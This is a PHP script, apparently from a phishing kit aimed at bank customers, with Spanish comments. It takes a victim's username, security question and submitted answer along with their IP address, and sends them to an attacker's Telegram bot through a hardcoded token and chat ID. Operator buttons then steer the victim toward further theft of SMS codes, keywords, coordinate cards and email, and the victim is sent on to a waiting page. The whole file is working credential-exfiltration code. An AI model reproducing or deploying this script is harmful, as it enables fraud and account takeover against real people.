<?php
session_start();

$usuario = $_SESSION['usuario'] ?? 'desconocido';
$pregunta = $_SESSION['pregunta'] ?? 'sin pregunta';
$respuesta = $_POST['respuesta'] ?? '';

function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

// Token y chat_id directamente
$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = "5157616506";

// Botones para redirigir desde Telegram
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
        ],
        [
            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"],
            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
        ]
    ]
];

$mensaje = "❓ Respuesta del cliente: $usuario\n📝 *$pregunta*\n✍️ $respuesta\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir nuevamente a espera.php
header("Location: espera.php");
exit;
?>
